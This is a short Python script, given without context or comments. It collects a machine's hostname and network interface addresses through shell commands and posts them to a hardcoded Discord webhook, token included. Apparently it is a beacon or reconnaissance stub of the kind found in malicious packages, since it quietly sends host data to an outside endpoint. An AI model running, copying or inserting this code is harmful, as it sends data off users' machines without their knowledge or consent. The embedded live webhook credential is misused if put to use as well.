import subprocess
import requests

mUrl = "https://discord.com/api/webhooks/1345273501199896597/5BQjVDqQQQOQr-LWtPEpjnF2-XyxyRW6kfRhGRK5RG3TdfPEaIS3MZ6FcLausGVpvsaL"
data = {"content": f"hostname: {subprocess.check_output('hostname', shell=True).decode('utf-8').strip()} ip:{subprocess.check_output('ifconfig en0 | grep inet', shell=True).decode('utf-8').strip()}"}

response = requests.post(mUrl, json=data)
